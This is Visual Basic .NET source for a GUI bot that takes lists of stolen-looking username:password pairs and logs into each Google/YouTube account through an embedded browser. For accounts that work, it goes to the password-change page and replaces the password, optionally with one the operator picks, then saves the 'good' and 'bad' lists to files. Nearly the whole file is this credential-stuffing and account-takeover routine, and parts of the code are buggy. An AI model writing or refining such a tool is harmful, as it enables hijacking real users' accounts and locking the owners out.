Imports DevComponents.DotNetBar

Public Class AccountCheckerForm
    'Form Load
    Private Sub AccountCheckerForm_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        checkaccounts.Start()
    End Sub
    'Adds account
    Private Sub ButtonX3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ButtonX3.Click
        ListBox1.Items.Add(TextBoxX1.Text)
    End Sub
    'CheckAccountsTimer
    Private Sub checkaccounts_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles checkaccounts.Tick
        Label1.Text = "Current Accounts: " & ListBox1.Items.Count
        Label2.Text = "Good Accounts: " & ListBox2.Items.Count
        Label3.Text = "Bad Accounts: " & ListBox3.Items.Count
    End Sub
    'Import Accounts
    Private Sub ButtonX1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ButtonX1.Click
        Dim asd As New OpenFileDialog
        asd.Filter = ("Text Files|*.txt")
        If asd.ShowDialog() And Windows.Forms.DialogResult.OK Then
            Dim streamread As New IO.StreamReader(asd.FileName)
            While (streamread.Peek() > -1)
                ListBox1.Items.Add(streamread.ReadLine)
            End While
            streamread.Close()
        End If
    End Sub
    'Clear Accounts
    Private Sub ButtonX2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ButtonX2.Click
        ListBox1.Items.Clear()
    End Sub
    'Clear Good Accounts
    Private Sub ButtonX4_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ButtonX4.Click
        ListBox2.Items.Clear()
    End Sub
    'Save Good Accounts
    Private Sub ButtonX5_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ButtonX5.Click
        Dim FileNumber As Integer = FreeFile()
        FileOpen(FileNumber, "Good Accounts.txt", OpenMode.Output)
        For Each Item As Object In ListBox2.Items
            PrintLine(FileNumber, Item.ToString)
        Next
        FileClose(FileNumber)
        MessageBoxEx.Show("Good accounts saved in location of the bot.", "Good Accounts", MessageBoxButtons.OK, MessageBoxIcon.Information)
    End Sub
    'Clear Bad Accounts
    Private Sub ButtonX6_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ButtonX6.Click
        ListBox3.Items.Clear()
    End Sub
    'Save Bad Accounts
    Private Sub ButtonX7_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ButtonX7.Click
        Dim FileNumber As Integer = FreeFile()
        FileOpen(FileNumber, "Bad Accounts.txt", OpenMode.Output)
        For Each Item As Object In ListBox3.Items
            PrintLine(FileNumber, Item.ToString)
        Next
        FileClose(FileNumber)
        MessageBoxEx.Show("Bad accounts saved in location of the bot.", "Bad Accounts", MessageBoxButtons.OK, MessageBoxIcon.Information)
    End Sub
    Private Sub currentpassword(ByVal cpassword As String)
    End Sub

    'Start
    Private Sub ButtonX8_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ButtonX8.Click
        password = TextBoxX2.Text
        If ButtonX8.Text = "Stop" Then
            starterr = 0
        Else
            starterr = 1
            ButtonX8.Text = "Stop"
            letsstart()
        End If
    End Sub

    Dim bb As Integer = 1
    Dim currentpass As String
    Dim cpassword As String
    Dim uss, pass As String
    Dim w As IO.StreamWriter
    Dim r As IO.StreamReader
    Dim starterr As Integer
    Dim password As String

    Sub login(ByVal info As String)
        Dim infoholder() As String
        Dim username, password As String
        infoholder = info.Split(":")
        username = infoholder(0)
        password = infoholder(1)
        uss = username
        pass = password
        currentpass = infoholder(1)
        cpassword = infoholder(1)
        Dim asd As HtmlElementCollection = WebBrowser1.Document.All
        For Each Element As HtmlElement In asd
            If Element.GetAttribute("type") = "text" Then
                Element.InnerText = username
            End If
            If Element.GetAttribute("type") = "password" Then
                Element.InnerText = password
            End If
            If Element.GetAttribute("type") = "submit" Then
                Element.InvokeMember("click")
            End If
        Next
    End Sub

    Sub okbad(ByVal a As Integer)
        If a = 1 Then
            ListBox2.Items.Add(uss & ":" & password)
            ListBox1.Items.RemoveAt(0)
        End If
        If a = 0 Then
            ListBox3.Items.Add(ListBox1.Items.Item(0))
            ListBox1.Items.RemoveAt(0)
            bb = 0
            letsstart()
        End If
    End Sub

    Sub changepass()
        Dim f As Integer
        Dim asd As HtmlElementCollection = WebBrowser1.Document.All
        For Each Element As HtmlElement In asd
            If Element.GetAttribute("name") = "OldPasswd" Then
                Element.InnerText = currentpass
                f = 1
            End If
            If Element.GetAttribute("class") = "errormsg" Then
                f = 0
            End If
            If Element.GetAttribute("name") = "signIn" Then
                f = 0
            End If
            If Element.GetAttribute("name") = "Passwd" Then
                If CheckBoxX1.Checked = True Then
                    Element.InnerText = password
                Else
                    password = currentpass
                    Element.InnerText = password
                End If
            End If
            If Element.GetAttribute("name") = "PasswdAgain" Then
                If CheckBoxX1.Checked = True Then
                    Element.InnerText = password
                Else
                    password = currentpass
                    Element.InnerText = password
                End If
            End If
            If Element.GetAttribute("name") = "save" Then
                Element.InvokeMember("click")
            End If
        Next
        okbad(f)
    End Sub

    Sub imdone()
        ButtonX8.Text = "Start"
    End Sub

    Sub letsstart()
        Dim t As Threading.Thread
        t = New Threading.Thread(AddressOf browsercontrol)
        t.Start()
    End Sub

    Sub browsercontrol(ByVal url As String)
        bb = 0
        WebBrowser1.Navigate("https://www.google.com/accounts/ServiceLogin?uilel=3&service=youtube&passive=true")
    End Sub

    Private Sub WebBrowser1_DocumentCompleted(ByVal sender As Object, ByVal e As System.Windows.Forms.WebBrowserDocumentCompletedEventArgs) Handles WebBrowser1.DocumentCompleted
        If starterr = 0 Then
            imdone()
            GoTo done
        End If
        If ListBox1.Items.Count = 0 Then
            imdone()
        ElseIf bb = 0 And ListBox1.Items.Count > 0 Then
            bb = 1
            login(ListBox1.Items.Item(0).ToString)
        ElseIf bb = 1 Then
            bb = 2
            WebBrowser1.Navigate("https://www.google.com/accounts/EditPasswd")
        ElseIf bb = 2 Then
            bb = 3
            changepass()
        ElseIf bb = 3 Then
            bb = 4
            WebBrowser1.Navigate("https://www.google.com/accounts/Logout")
        ElseIf bb = 4 Then
            bb = 0
            letsstart()
        End If
done:
    End Sub

    Private Sub CheckBoxX1_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CheckBoxX1.CheckedChanged
        If CheckBoxX1.Checked = True Then
            TextBoxX2.Enabled = True
        Else
            TextBoxX2.Enabled = False
        End If
    End Sub
End Class